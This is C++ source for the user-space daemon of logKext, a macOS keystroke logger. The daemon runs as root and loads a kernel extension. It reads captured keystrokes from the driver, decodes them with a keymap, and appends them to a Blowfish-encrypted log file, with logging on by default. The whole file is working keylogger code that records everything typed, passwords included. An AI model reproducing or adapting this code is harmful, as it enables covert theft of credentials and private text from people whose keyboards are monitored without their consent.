/*
 *  logKextDaemon.cpp
 *  logKext
 *
 *  Created by Braden Thomas on Wed Sep 15 2004.
 *
 */
#include <unistd.h>
#include <sys/mount.h>
#include <openssl/blowfish.h>
#include <openssl/md5.h>
#include <openssl/rand.h>
#include <syslog.h>

#include <sys/stat.h>
#include <IOKit/IOKitLib.h>
#include <CoreFoundation/CoreFoundation.h>
#include <Security/Security.h>

#include "logKextDaemon.h"
#include "logKextCommon.h"

#define NOT_LOGGING_SLEEP	10
#define TIME_TO_SLEEP		2

/**********Function Declarations*************/

void write_buffer(CFStringRef);
int load_kext();
bool outOfSpace(CFStringRef);
void stamp_file(CFStringRef);
bool fileExists(CFStringRef);
void updateEncryption();
void updateKeymap();

void getBufferSizeAndKeys(int *size,int *keys);
CFStringRef getBuffer();
bool connectToKext();
void makeEncryptKey(CFStringRef pass);

/****** Globals ********/
io_connect_t		userClient;
CFWriteStreamRef	logStream;
CFMutableDataRef	encrypt_buffer;		// 8 bytes
CFDictionaryRef		keymap;

CFBooleanRef		doEncrypt;
BF_KEY				encrypt_bf_key;
CFBooleanRef		showMods;

/****** Main ********/

int main()
{
	int error=noErr;

	if (geteuid())
	{
		syslog(LOG_ERR,"Error: Daemon must run as root.");
		exit(geteuid());
	}
	
	encrypt_buffer = CFDataCreateMutable(kCFAllocatorDefault,8);
	
/*********Set up File**********/

	CFStringRef pathName = (CFStringRef)CFPreferencesCopyAppValue(CFSTR("Pathname"),PREF_DOMAIN);
	if (!pathName)
	{
		pathName = CFSTR(DEFAULT_PATHNAME);
		CFPreferencesSetAppValue(CFSTR("Pathname"),pathName,PREF_DOMAIN);
	}

	CFURLRef logPathURL = CFURLCreateWithFileSystemPath(kCFAllocatorDefault,pathName,kCFURLPOSIXPathStyle,false);	
	logStream = CFWriteStreamCreateWithFile(kCFAllocatorDefault,logPathURL);
	CFRelease(logPathURL);

	if (!logStream)
	{
		syslog(LOG_ERR,"Error: Couldn't open file stream at start.");	
		return 1;
	}

/*********Check encryption & keymap**********/

	updateEncryption();
	updateKeymap();

/*********Check space**********/

	if (outOfSpace(pathName))
	{
		stamp_file(CFSTR("Not enough disk space remaining!"));
		return 1;
	}

/*********Connect to kernel extension**********/
	
	if (!connectToKext())
	{
		if (load_kext())
		{
			stamp_file(CFSTR("Could not load KEXT"));
			return 1;
		}
		if (!connectToKext())
		{
			stamp_file(CFSTR("Could not connect with KEXT"));
			return 1;
		}
	}
	sleep(1);		// just a little time to let the kernel notification handlers finish
	
	stamp_file(CFSTR("LogKext Daemon starting up"));
	
	CFPreferencesAppSynchronize(PREF_DOMAIN);
	
/*********Daemon run loop**********/

	while (1)
	{

/*********Wait if not logging**********/

		Boolean validKey;
		CFPreferencesAppSynchronize(PREF_DOMAIN);
		CFBooleanRef isLogging = (CFPreferencesGetAppBooleanValue(CFSTR("Logging"),PREF_DOMAIN,&validKey))?kCFBooleanTrue:kCFBooleanFalse;
		if (!validKey)
		{
			isLogging = kCFBooleanTrue;
			CFPreferencesSetAppValue(CFSTR("Logging"),isLogging,PREF_DOMAIN);
		}
		
		if (!CFBooleanGetValue(isLogging))
		{
			sleep(NOT_LOGGING_SLEEP);
			continue;
		}
		
/********* Check the buffer **********/

		int buffsize=0;
		int keys=0;
		getBufferSizeAndKeys(&buffsize,&keys);

		#ifdef DEBUG
			syslog(LOG_ERR,"Buffsize %d, Keys %d.",buffsize,keys);	
		#endif

		if (!keys)			// no keyboards logged
			return 2;

		if (buffsize < MAX_BUFF_SIZE/10)
		{
			sleep(TIME_TO_SLEEP);
			continue;
		}

/********* Get the buffer **********/

		CFStringRef the_buffer = getBuffer();
		
/********* Check defaults/file **********/		
	
		CFStringRef curPathName = (CFStringRef)CFPreferencesCopyAppValue(CFSTR("Pathname"),PREF_DOMAIN);
		if (!curPathName)		// path has been deleted
		{
			pathName = CFSTR(DEFAULT_PATHNAME);
			CFPreferencesSetAppValue(CFSTR("Pathname"),pathName,PREF_DOMAIN);

			logStream = CFWriteStreamCreateWithFile(kCFAllocatorDefault,CFURLCreateWithFileSystemPath(kCFAllocatorDefault,pathName,kCFURLPOSIXPathStyle,false));

			if (!logStream)
			{
				syslog(LOG_ERR,"Error: Couldn't open file stream while running.");	
				return 1;
			}


		}
		else if (CFStringCompare(curPathName,pathName,0)!=kCFCompareEqualTo)	// path has changed
		{
			pathName = curPathName;			
			logStream = CFWriteStreamCreateWithFile(kCFAllocatorDefault,CFURLCreateWithFileSystemPath(kCFAllocatorDefault,pathName,kCFURLPOSIXPathStyle,false));

			if (!logStream)
			{
				syslog(LOG_ERR,"Error: Couldn't open file stream while running.");	
				return 1;
			}
			
			CFDataDeleteBytes(encrypt_buffer,CFRangeMake(0,CFDataGetLength(encrypt_buffer)));
		}

		if (!fileExists(pathName))		// when file is deleted, we resync the encryption & keymap preferences
		{
			CFPreferencesAppSynchronize(PREF_DOMAIN);
			updateEncryption();
			updateKeymap();
	
			logStream = CFWriteStreamCreateWithFile(kCFAllocatorDefault,CFURLCreateWithFileSystemPath(kCFAllocatorDefault,pathName,kCFURLPOSIXPathStyle,false));

			if (!logStream)
			{
				syslog(LOG_ERR,"Error: Couldn't open file stream while running.");	
				return 1;
			}

			stamp_file(CFSTR("LogKext Daemon created new logfile"));
		}

		if (outOfSpace(pathName))
		{
			stamp_file(CFSTR("Not enough disk space remaining!"));
			break;
		}

/********* Finally, write the buffer **********/

		write_buffer(the_buffer);
		CFRelease(the_buffer);		
	}

	stamp_file(CFSTR("Server error: closing Daemon"));	
	CFWriteStreamClose(logStream);
	
	return error;
}

int load_kext()
{
    int childStatus = 0;
    pid_t pid = fork();
    if (!pid)
	{
		execl("/sbin/kextload", "/sbin/kextload", "-b", KEXT_ID, NULL);
		_exit(0);
	}

	waitpid(pid, &childStatus, 0);
		
	return childStatus;
}

void updateKeymap()
{
	if (!fileExists(CFSTR(KEYMAP_PATH)))
	{
		stamp_file(CFSTR("Error: Keymap file is missing"));
		keymap = NULL;
		return;
	}
	
	CFReadStreamRef readStream = CFReadStreamCreateWithFile(kCFAllocatorDefault,CFURLCreateWithFileSystemPath(kCFAllocatorDefault,CFSTR(KEYMAP_PATH),kCFURLPOSIXPathStyle,false));
	if (!readStream||!(CFReadStreamOpen(readStream)))
	{
		stamp_file(CFSTR("Error: Can't open keymap file"));
		keymap = NULL;
		return;
	}
	keymap = (CFDictionaryRef)CFPropertyListCreateFromStream(kCFAllocatorDefault,readStream,0,kCFPropertyListImmutable,NULL,NULL);
	CFReadStreamClose(readStream);
	if (!keymap)
	{
		stamp_file(CFSTR("Error: Can't read keymap file"));
		return;
	}
	
	Boolean validKey;
	showMods = (CFPreferencesGetAppBooleanValue(CFSTR("Mods"),PREF_DOMAIN,&validKey))?kCFBooleanTrue:kCFBooleanFalse;
	if (!validKey)
	{
		showMods = kCFBooleanTrue;
		CFPreferencesSetAppValue(CFSTR("Mods"),showMods,PREF_DOMAIN);
	}
}

void updateEncryption()
{
	Boolean validKey;
	doEncrypt = (CFPreferencesGetAppBooleanValue(CFSTR("Encrypt"),PREF_DOMAIN,&validKey))?kCFBooleanTrue:kCFBooleanFalse;
	if (!validKey)
	{
		doEncrypt = kCFBooleanTrue;
		CFPreferencesSetAppValue(CFSTR("Encrypt"),doEncrypt,PREF_DOMAIN);
	}
	
	CFStringRef password = (CFStringRef)CFPreferencesCopyAppValue(CFSTR("Password"),PREF_DOMAIN);
	if (!password)
	{
		password = CFSTR(DEFAULT_PASSWORD);
		
		unsigned char md5[16];
		MD5((const unsigned char*)CFStringGetCStringPtr(password,CFStringGetFastestEncoding(password)),CFStringGetLength(password),md5);
		char hash[32];
		for (int i=0; i< 16; i++) 
			sprintf(hash+2*i,"%02x",md5[i]);
		password = CFStringCreateWithCString(kCFAllocatorDefault,hash,kCFStringEncodingASCII);
		
		CFPreferencesSetAppValue(CFSTR("Password"),password,PREF_DOMAIN);
	}
	makeEncryptKey(password);
}

void makeEncryptKey(CFStringRef pass)
{
	UInt32 passLen;
	void* passData;
	OSStatus secRes = SecKeychainFindGenericPassword(NULL, strlen("logKextPassKey"), "logKextPassKey", NULL, NULL, &passLen, &passData, NULL);
	if (secRes && secRes != errSecItemNotFound)
	{
		syslog(LOG_ERR,"Error finding passKey in keychain.  Using default.");
		passData=(void*)DEFAULT_PASSKEY;
		passLen=strlen((char*)passData);
	}
	else if (secRes == errSecItemNotFound)
	{
		passData = malloc(16);
		RAND_bytes((unsigned char*)passData, 16);
		passLen=16;
		SecKeychainAddGenericPassword(NULL, strlen("logKextPassKey"), "logKextPassKey", NULL, NULL, 16, passData, NULL);
	}
	BF_KEY temp_key;
	BF_set_key(&temp_key,passLen,(unsigned char*)passData);
	unsigned char *encrypt_key = new unsigned char[8];
	BF_ecb_encrypt((const unsigned char*)CFStringGetCStringPtr(pass,CFStringGetFastestEncoding(pass)),encrypt_key,&temp_key,BF_ENCRYPT);
	BF_set_key(&encrypt_bf_key,8,encrypt_key);
	
	return;
}

bool fileExists(CFStringRef pathName)
{
	struct stat fileStat;
	if (stat(CFStringGetCStringPtr(pathName,CFStringGetFastestEncoding(pathName)),&fileStat))
		return false;
	return true;
}

bool outOfSpace(CFStringRef pathName)
{
	Boolean validKey;
	int minMeg = CFPreferencesGetAppIntegerValue(CFSTR("MinMeg"),PREF_DOMAIN,&validKey);
	if (!validKey)
	{
		minMeg = DEFAULT_MEG;
		CFPreferencesSetAppValue(CFSTR("MinMeg"),CFNumberCreate(kCFAllocatorDefault,kCFNumberIntType,&minMeg),PREF_DOMAIN);
	}

	struct statfs fileSys;
	int error = statfs(CFStringGetCStringPtr(pathName,CFStringGetFastestEncoding(pathName)),&fileSys);
	if (error)
		return false;
	long megLeft = (fileSys.f_bsize/1024)*(fileSys.f_bavail/1024);

	if (megLeft < minMeg)
		return true;
		
	return false;
}

void stamp_file(CFStringRef inStamp)
{
	time_t the_time;
	time(&the_time);
	CFStringRef stamp = CFStringCreateWithFormat(kCFAllocatorDefault,NULL,CFSTR("\n%@ : %s"),inStamp,ctime(&the_time));
	write_buffer(stamp);
}

void write_buffer(CFStringRef inData)
{
	#ifdef DEBUG
		syslog(LOG_ERR,"Writing buffer to file.");
	#endif

	if (CFWriteStreamGetStatus(logStream)!=kCFStreamStatusOpen)
	{
		CFWriteStreamSetProperty(logStream,kCFStreamPropertyAppendToFile,kCFBooleanTrue);
		CFWriteStreamOpen(logStream);
	}

	if (!CFBooleanGetValue(doEncrypt))
	{
		CFWriteStreamWrite(logStream,(const UInt8*)CFStringGetCStringPtr(inData,CFStringGetFastestEncoding(inData)),CFStringGetLength(inData));
		return;
	}

	int buff_pos = 0;

	while (1)
	{	
		int avail_space = 8-CFDataGetLength(encrypt_buffer);					//space rem in buffer
		int rem_to_copy = CFStringGetLength(inData)-buff_pos;					//stuff in data that needs to be copied
		int to_copy = rem_to_copy<avail_space?rem_to_copy:avail_space;			//amount left to encryp, or avail space
		
		if (avail_space)
		{	
			UInt8 tmp_buff[to_copy];
			CFStringGetBytes(inData,CFRangeMake(buff_pos,to_copy),kCFStringEncodingNonLossyASCII,0,false,tmp_buff,8,NULL);
			CFDataAppendBytes(encrypt_buffer,tmp_buff,to_copy);
			
			avail_space -= to_copy;
			if (avail_space>0)			// small buffer? still space left?
				break;
			buff_pos += to_copy;			//move along the buffer
		}
		
		UInt8 enc_buff[8];
		BF_ecb_encrypt(CFDataGetBytePtr(encrypt_buffer),enc_buff,&encrypt_bf_key,BF_ENCRYPT);
		CFWriteStreamWrite(logStream,enc_buff,8);

		CFDataDeleteBytes(encrypt_buffer,CFRangeMake(0,8));
		
		if (buff_pos==CFStringGetLength(inData))				//just in case buffer happens to fit perfectly
			break;
	}
	
	return;

}

bool connectToKext()
{
	kern_return_t	kernResult; 
    mach_port_t		masterPort;
    io_service_t	serviceObject = 0;
    io_iterator_t 	iterator;
    CFDictionaryRef	classToMatch;
	Boolean			result = true;	// assume success
    
    // return the mach port used to initiate communication with IOKit
    kernResult = IOMasterPort(MACH_PORT_NULL, &masterPort);
    if (kernResult != KERN_SUCCESS)
		return false;
    
    classToMatch = IOServiceMatching( "com_fsb_iokit_logKext" );
    if (!classToMatch)
		return false;

    // create an io_iterator_t of all instances of our driver's class
	// that exist in the IORegistry
    kernResult = IOServiceGetMatchingServices(masterPort, classToMatch, &iterator);
    if (kernResult != KERN_SUCCESS)
		return false;
			    
    // get the first item in the iterator.
    serviceObject = IOIteratorNext(iterator);
    
    // release the io_iterator_t now that we're done with it.
    IOObjectRelease(iterator);
    
    if (!serviceObject){
		result = false;
		goto bail;
    }
	
	// instantiate the user client
    kernResult = IOServiceOpen(serviceObject, mach_task_self(), 0, &userClient);
	if(kernResult != KERN_SUCCESS) {
		result = false;
		goto bail;
    }
	
	bail:
	if (serviceObject) {
		IOObjectRelease(serviceObject);
	}
	
    return result;
}

void getBufferSizeAndKeys(int* size, int* keys)
{
	kern_return_t kernResult;

	UInt32		bufferSize=0;
	UInt32		kextKeys=0;	

    kernResult = IOConnectMethodScalarIScalarO(userClient,
													klogKextBuffandKeys,	
													0,					// input count
													2,					// output count
													&bufferSize,
													&kextKeys);		// ptr to output structure
	*size=bufferSize;
	*keys=kextKeys;
	return;
}

CFStringRef getBuffer()
{
	kern_return_t kernResult;
	bufferStruct myBufStruct;
	IOByteCount structSize = sizeof(myBufStruct);

    kernResult = IOConnectMethodScalarIStructureO(userClient,
													 klogKextBuffer,	
													 0,					// input count
													 &structSize,
													 &myBufStruct);

	CFDataRef result = CFDataCreate(kCFAllocatorDefault,myBufStruct.buffer,myBufStruct.bufLen);
	CFMutableStringRef decodedData = CFStringCreateMutable(kCFAllocatorDefault,0);
	
	if (!keymap)
		return decodedData;
	
	CFDictionaryRef flagsDict = (CFDictionaryRef)CFDictionaryGetValue(keymap,CFSTR("Flags"));
	if (!flagsDict)
		return decodedData;
	CFDictionaryRef ucDict = (CFDictionaryRef)CFDictionaryGetValue(keymap,CFSTR("Uppercase"));
	if (!ucDict)
		return decodedData;
	CFDictionaryRef lcDict = (CFDictionaryRef)CFDictionaryGetValue(keymap,CFSTR("Lowercase"));
	if (!lcDict)
		return decodedData;

	CFNumberFormatterRef myNF = CFNumberFormatterCreate(kCFAllocatorDefault,CFLocaleCopyCurrent(),kCFNumberFormatterNoStyle);
	
	for (int i=0; i<CFDataGetLength(result);i+=2)
	{
		u_int16_t curChar;
		CFDataGetBytes(result,CFRangeMake(i,2),(UInt8*)&curChar);
		bool isUpper = false;
		
		if (CFBooleanGetValue(showMods))
		{
			char flagTmp = (curChar >> 11);
			
			if (flagTmp & 0x01)
				CFStringAppend(decodedData,(CFStringRef)CFDictionaryGetValue(flagsDict,CFSTR("0x01")));

			if (flagTmp & 0x02)
				CFStringAppend(decodedData,(CFStringRef)CFDictionaryGetValue(flagsDict,CFSTR("0x02")));

			if (flagTmp & 0x04)
				CFStringAppend(decodedData,(CFStringRef)CFDictionaryGetValue(flagsDict,CFSTR("0x04")));

			if (flagTmp & 0x08)
				CFStringAppend(decodedData,(CFStringRef)CFDictionaryGetValue(flagsDict,CFSTR("0x08")));
				
			if (flagTmp & 0x10)
				isUpper = true;
		}

		curChar &= 0x07ff;		
		CFStringRef keyChar = CFNumberFormatterCreateStringWithValue(kCFAllocatorDefault,myNF,kCFNumberShortType,&curChar);
		CFStringRef text;

		if (isUpper)
			text = (CFStringRef)CFDictionaryGetValue(ucDict,keyChar);
		else
			text = (CFStringRef)CFDictionaryGetValue(lcDict,keyChar);		
		
		if (text)
		{
			if (CFStringCompare(text,CFSTR("\\n"),0)==kCFCompareEqualTo)
				text = CFSTR("\n");

			CFStringAppend(decodedData,text);
		}
		else
			syslog(LOG_ERR,"Unmapped key %d",curChar);		
	}

	return decodedData;
}
